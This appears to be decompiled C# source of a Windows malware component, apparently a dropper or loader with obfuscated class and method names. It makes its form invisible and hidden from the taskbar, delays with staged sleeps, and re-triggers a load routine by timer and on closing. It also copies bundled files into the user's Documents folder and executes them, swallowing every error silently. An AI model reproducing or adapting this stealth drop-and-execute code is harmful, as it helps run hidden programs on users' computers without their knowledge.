using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace othvidtiraw;

public class Form1 : Form
{
	private MEWDRM othvidtirawmainvp = new MEWDRM();

	private byte[] appByts;

	private THRWARE thiqavsnaisStateObj = new THRWARE();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void oden_files()
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetDirectoryName(Application.get_ExecutablePath()));
			FileInfo[] files = directoryInfo.GetFiles("*.fodd");
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + fileInfo.Name.Replace(".ford", "").Replace("$", ".");
				File.WriteAllBytes(text, File.ReadAllBytes(fileInfo.FullName));
				Process.Start(text);
			}
		}
		catch (Exception)
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_ShowInTaskbar(false);
			Thread.Sleep(1100);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			Thread.Sleep(6100);
			othvidtirawmainvp.othvidtirawdowStart();
		}
		catch (Exception)
		{
		}
	}

	private void thiqavsnaiscallCon()
	{
		try
		{
			TimerCallback callback = thiqavsnaissetupCons;
			Timer othvidtirawtimer = new Timer(callback, thiqavsnaisStateObj, 41110, 32110);
			thiqavsnaisStateObj.othvidtirawtimer = othvidtirawtimer;
		}
		catch
		{
		}
	}

	private void thiqavsnaissetupCons(object dource)
	{
		try
		{
			othvidtirawmainvp.othvidtirawload_apep();
			thiqavsnaisStateObj.othvidtirawtimer.Dispose();
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Thread.Sleep(100);
			othvidtirawmainvp.othvidtirawload_apep();
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
